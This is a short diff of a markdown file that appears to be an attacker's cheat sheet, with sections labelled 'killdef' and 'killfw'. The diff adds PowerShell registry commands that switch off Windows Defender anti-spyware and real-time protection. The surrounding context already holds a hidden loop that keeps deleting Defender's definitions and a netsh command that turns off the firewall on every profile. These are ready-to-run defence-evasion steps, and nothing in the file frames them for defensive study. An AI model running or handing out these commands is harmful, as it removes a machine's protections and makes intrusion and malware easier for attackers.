@@ -321,6 +321,13 @@ killdef
 ```
 start-process powershell.exe -argumentlist "while(1){& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All;start-sleep -seconds 300}" -windowstyle hidden
 ```
+```
+Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender' -name "DisableAntiSpyware" -value 1
+Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection' -name "DisableRealtimeMonitoring" -value 1
+Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection' -name "DpaDisabled" -value 1
+Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows Defender\Real-Time Protection' -name "DisableRealtimeMonitoring" -value 1
+Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows Defender\Real-Time Protection' -name "DpaDisabled" -value 1
+```
 killfw
 ```
 netsh advfirewall set allprofiles state off
